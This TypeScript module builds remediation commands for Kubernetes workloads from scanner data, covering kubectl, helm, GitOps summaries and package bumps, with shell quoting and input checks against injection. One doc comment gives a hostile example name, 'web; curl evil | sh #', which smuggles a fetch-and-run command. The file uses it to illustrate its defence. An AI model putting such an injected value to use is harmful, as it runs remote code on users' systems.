/**
 * The delivery path: how "change `image:` from A to B" reaches one workload.
 *
 * `remediation-workflow.md` phase 2. A fix the user has to translate into a
 * command themselves is half a fix, so each workload running an image gets the
 * instruction that matches how it is *actually* deployed:
 *
 * | Managed by | Output |
 * |---|---|
 * | ArgoCD (or Flux) | Where the fix is made in git — app, repo, path. A
 * |                  | `kubectl`/`helm` change would be reverted by the next
 * |                  | sync, so no imperative command is offered. |
 * | Helm             | `helm upgrade … --reuse-values --set image.tag=…` |
 * | Neither          | `kubectl set image <kind>/<name> …` |
 *
 * ## What this module refuses to say
 *
 * - **`kubectl set image deployment/x` for a StatefulSet is worse than
 *   nothing**, so the kubectl row requires a *resolved* workload kind — the
 *   scanner reports `null` when the owner chain dead-ends, never a guess —
 *   and only kinds where an in-place image bump takes effect.
 * - **"Not chart-managed" is a claim about the customer's cluster.** When the
 *   cluster's `ownerMetadataCollected` is false or null the agent could not
 *   read controllers, so a workload with no release row may well be
 *   chart-managed, and the honest output is "unknown", not a kubectl command.
 * - **No target, no command.** Without a measured tag to move to there is
 *   nothing safe to paste; the row still says how the workload is deployed.
 *
 * Pure functions — every rule above is unit-testable without a database.
 */

import { stringify as stringifyYaml } from "yaml";

export interface DeliveryWorkload {
    name: string;
    /** `null` when the scanner could not resolve `ownerReferences`. */
    kind: string | null;
    /** The workload's namespace — where `kubectl set image` runs. */
    namespace: string;
}

export interface DeliveryRelease {
    name: string;
    /** The release's own namespace, which may differ from the workload's. */
    namespace: string;
    chartName: string | null;
    chartVersion: string | null;
}

export interface DeliveryApplication {
    tool: string;
    name: string;
    namespace: string;
    repoUrl: string | null;
    targetRevision: string | null;
    chart: string | null;
    path: string | null;
}

export interface DeliveryInput {
    workload: DeliveryWorkload;
    containerName: string;
    /** The reference the pod spec asked for, verbatim. */
    imageRef: string;
    currentTag: string | null;
    /** The measured tag to move to. Null when no upgrade has been priced. */
    targetTag: string | null;
    release: DeliveryRelease | null;
    application: DeliveryApplication | null;
    /** `clusters.ownerMetadataCollected === true` — see the module header. */
    ownerMetadataKnown: boolean;
}

export type DeliveryMethod = "argocd" | "flux" | "helm" | "kubectl" | "unknown";

export interface DeliveryInstruction {
    method: DeliveryMethod;
    /** Copy-pasteable. Null when nothing can honestly be emitted. */
    command: string | null;
    /** One sentence: how this workload is deployed / where the fix is made. */
    summary: string;
    /** What keeps the command from being complete or from existing at all. */
    caveat: string | null;
}

/**
 * Kinds where bumping the pod template's image in place takes effect. A Job's
 * pods have run; a ReplicaSet is usually owned by a Deployment we failed to
 * infer; a bare Pod's spec is immutable — for all of those the honest output
 * is context without a command.
 */
const SET_IMAGE_KINDS = new Set(["Deployment", "StatefulSet", "DaemonSet", "CronJob"]);

/**
 * Characters that need no quoting in a POSIX shell word. Everything a real
 * release name, namespace, tag, image ref or chart version contains is here;
 * anything else gets single-quoted.
 */
const SHELL_SAFE = /^[A-Za-z0-9._:/@+=-]+$/;

/**
 * Quote one value for copy-paste into a POSIX shell (security review S10).
 *
 * The values interpolated below are scanner-supplied (workload and release
 * names, tags) or chart-repo-supplied (chart versions) — i.e. controlled by
 * whoever holds a scanner key or serves a chart index. The inventory schema
 * now rejects hostile names at ingest, but the command builder must not
 * depend on that: a workload named `web; curl evil | sh #` becomes the
 * harmless quoted word `'web; curl evil | sh #'`, never a second command.
 */
export function shellQuote(value: string): string {
    if (SHELL_SAFE.test(value)) return value;
    return `'${value.replaceAll("'", `'\\''`)}'`;
}

/**
 * Swap the tag in an image reference. Prefers editing the verbatim ref (which
 * keeps registry, port and repository exactly as the pod spec spelled them);
 * falls back to `<repo>:<tag>` when the ref does not end in the current tag
 * (digest-pinned, or the tag was not collected).
 */
export function retagImageRef(imageRef: string, currentTag: string | null, targetTag: string): string {
    if (currentTag && imageRef.endsWith(`:${currentTag}`)) {
        return imageRef.slice(0, -currentTag.length) + targetTag;
    }
    // Digest-pinned (`repo@sha256:…`) or untagged ref: strip any digest and
    // re-tag what remains.
    const withoutDigest = imageRef.split("@")[0]!;
    return `${withoutDigest}:${targetTag}`;
}

/** `helm upgrade` for an image-scoped move within one release. */
function helmCommand(release: DeliveryRelease, targetTag: string): string {
    return (
        `helm upgrade ${shellQuote(release.name)} -n ${shellQuote(release.namespace)} ` +
        `--reuse-values --set ${shellQuote(`image.tag=${targetTag}`)}`
    );
}

/** Where an ArgoCD/Flux-delivered fix is made — a place, not a command. */
function gitopsSummary(app: DeliveryApplication, release: DeliveryRelease | null): string {
    const tool = app.tool === "argocd" ? "ArgoCD" : app.tool === "flux" ? "Flux" : app.tool;
    const source =
        app.chart != null
            ? `chart ${app.chart}${app.targetRevision ? `@${app.targetRevision}` : ""}`
            : app.path != null
              ? `path ${app.path}${app.targetRevision ? ` @ ${app.targetRevision}` : ""}`
              : null;
    const where = [
        `Delivered by ${tool} application ${app.name} (namespace ${app.namespace})`,
        app.repoUrl ? `from ${app.repoUrl}` : null,
        source,
    ]
        .filter(Boolean)
        .join(", ");
    const via = release ? ` — rendered via Helm chart ${release.chartName ?? release.name}` : "";
    return `${where}${via}. Make the change in that source; a direct cluster edit is reverted on the next sync.`;
}

/**
 * The instruction for one workload running the image. Precedence is
 * delivery-first: a GitOps app owns the manifests, so it wins over the chart
 * that packaged them, which wins over a bare `kubectl`.
 */
export function buildDelivery(input: DeliveryInput): DeliveryInstruction {
    const { workload, application, release, targetTag } = input;

    if (application) {
        return {
            method: application.tool === "flux" ? "flux" : "argocd",
            command: null,
            summary: gitopsSummary(application, release),
            caveat:
                application.repoUrl == null
                    ? "The scanner could only read the tracking label, not the Application object, so the repository and path are unknown."
                    : null,
        };
    }

    if (release) {
        const chart = release.chartName
            ? `chart ${release.chartName}${release.chartVersion ? ` ${release.chartVersion}` : ""}`
            : "an unidentified chart";
        if (targetTag == null) {
            return {
                method: "helm",
                command: null,
                summary: `Managed by Helm release ${release.name} (namespace ${release.namespace}), ${chart}.`,
                caveat: "No measured target tag to set, so no command is offered.",
            };
        }
        return {
            method: "helm",
            command: helmCommand(release, targetTag),
            summary: `Managed by Helm release ${release.name} (namespace ${release.namespace}), ${chart}.`,
            caveat: "Assumes the chart exposes image.tag. If the chart pins the tag, upgrade the chart version instead.",
        };
    }

    if (!input.ownerMetadataKnown) {
        return {
            method: "unknown",
            command: null,
            summary: "How this workload is deployed is unknown.",
            caveat: "The scanner could not read controller metadata in this cluster, so this workload may well be chart-managed. No command is offered on that evidence.",
        };
    }

    if (workload.kind == null) {
        return {
            method: "unknown",
            command: null,
            summary: "Not chart-managed, but the workload's controller could not be resolved.",
            caveat: "Without a resolved kind, `kubectl set image` would be a guess — and a wrong resource kind is worse than no command.",
        };
    }

    if (!SET_IMAGE_KINDS.has(workload.kind)) {
        return {
            method: "kubectl",
            command: null,
            summary: `Not chart-managed; the workload is a ${workload.kind}.`,
            caveat: `An in-place image bump does not take effect on a ${workload.kind} — recreate it with the new image instead.`,
        };
    }

    if (targetTag == null) {
        return {
            method: "kubectl",
            command: null,
            summary: `Not chart-managed; deployed as a ${workload.kind}.`,
            caveat: "No measured target tag to set, so no command is offered.",
        };
    }

    const ref = retagImageRef(input.imageRef, input.currentTag, targetTag);
    return {
        method: "kubectl",
        command:
            `kubectl set image ${shellQuote(`${workload.kind.toLowerCase()}/${workload.name}`)} ` +
            `${shellQuote(`${input.containerName}=${ref}`)} -n ${shellQuote(workload.namespace)}`,
        summary: `Not chart-managed; deployed as a ${workload.kind}.`,
        caveat: null,
    };
}

/**
 * The release-scoped escalation: one `helm upgrade --version` moving every
 * image the chart deploys. Only for a release no GitOps tool delivers — the
 * caller checks, because for a delivered release the answer is the app.
 */
export function buildReleaseUpgradeCommand(release: DeliveryRelease, targetChartVersion: string): string {
    return (
        `helm upgrade ${shellQuote(release.name)} -n ${shellQuote(release.namespace)} ` +
        `--reuse-values --version ${shellQuote(targetChartVersion)}`
    );
}

export interface ValuesOverride {
    /** A values-file fragment pointing the chart at the measured tag. */
    snippet: string;
    /** Why the snippet is a starting point and not an answer. */
    caveat: string;
}

/**
 * The values override for a chart-pinned image — the smaller blast radius
 * than a chart bump when a measured better tag exists
 * (fix-tab-suggestions.md, phase 1).
 *
 * We cannot see the chart's values schema, so `image.tag` is a convention,
 * not a fact about this chart — the caveat says so, and it also says the one
 * thing that silently undoes the fix: an override the chart does not
 * parameterise is reverted by the next sync.
 */
export function buildValuesOverride(input: { repository: string | null; targetTag: string }): ValuesOverride {
    // The comment line must stay one comment line: strip anything that could
    // end it (newlines, other control characters) from the scanner-supplied
    // repository. The mapping itself is emitted by the yaml library, never by
    // string templating, so a hostile tag cannot inject sibling keys (S10).
    const repository = input.repository?.replace(/[^\x20-\x7e]/g, "") || null;
    const where = repository ? ` for ${repository}` : "";
    const mapping = stringifyYaml(
        { image: { tag: input.targetTag } },
        { defaultStringType: "QUOTE_DOUBLE", defaultKeyType: "PLAIN" },
    ).trimEnd();
    return {
        snippet: `# Override the image tag${where} in this release's values.\n${mapping}`,
        caveat:
            "Starting point only: the chart's values schema is not visible to us, so the key may " +
            "differ (per-component charts often use <component>.image.tag). An override the chart " +
            "does not parameterise is reverted by the next sync.",
    };
}

// ---------------------------------------------------------------------------
// The dependency bump — component tier plan, item 4
// ---------------------------------------------------------------------------

export interface DependencyBumpInput {
    /** The component's PURL. Its type names the package manager; nothing else does. */
    purl: string | null;
    /** The package as the finding names it. */
    name: string;
    fixedVersion: string | null;
}

/** Characters a package name or version may carry into a shell line. Anything else refuses. */
const SAFE_TOKEN = /^[A-Za-z0-9@/._+~:-]+$/;

/**
 * The one line that bumps a dependency to its fixed version, for the four
 * ecosystems where that line is unambiguous:
 *
 * | PURL type | Command |
 * |---|---|
 * | `npm`    | `npm install lodash@4.17.21` |
 * | `pypi`   | `pip install requests==2.32.4` |
 * | `golang` | `go get golang.org/x/net@v0.38.0` |
 * | `gem`    | `bundle update nokogiri --conservative` |
 *
 * It is advice for the customer's own repository — the image is rebuilt from
 * it — so it is only ever offered for an *application* finding, and there is
 * no button: nothing here can be applied from the product.
 *
 * ## What this refuses to say
 *
 * - **No fixed version, no command.** "Upgrade" without a target is not advice.
 * - **No PURL, or a type outside the table, no command.** Maven, NuGet, Cargo
 *   and Composer pin versions in a manifest whose shape we cannot see from an
 *   SBOM (a BOM import, a parent POM, a workspace); a command that edits the
 *   wrong one is worse than none. Distro packages are the base image's — the
 *   fix there is a rebuild, not an `apt install`.
 * - **Nothing that is not plainly a package name and a version.** The line is
 *   meant to be pasted into a shell, and an SBOM is uploaded content.
 *
 * Go's fixed versions come from OSV without the `v` the toolchain requires;
 * the prefix is added when missing. Ruby's answer is Bundler's, because a
 * bare `gem install` does not change what the application's lockfile loads.
 */
export function dependencyBumpCommand(input: DependencyBumpInput): string | null {
    const version = input.fixedVersion?.trim();
    if (!version || !input.purl) return null;

    const type = /^pkg:([A-Za-z0-9.+-]+)\//.exec(input.purl)?.[1]?.toLowerCase();
    const name = input.name.trim();
    if (!type || !name || !SAFE_TOKEN.test(name) || !SAFE_TOKEN.test(version)) return null;

    switch (type) {
        case "npm":
            return `npm install ${name}@${version}`;
        case "pypi":
            return `pip install ${name}==${version}`;
        case "golang":
            // The standard library is the toolchain's, not a module: its fix
            // is a newer Go in the build image, which no `go get` expresses.
            if (name === "stdlib") return null;
            return `go get ${name}@${version.startsWith("v") ? version : `v${version}`}`;
        case "gem":
            return `bundle update ${name} --conservative`;
        default:
            return null;
    }
}
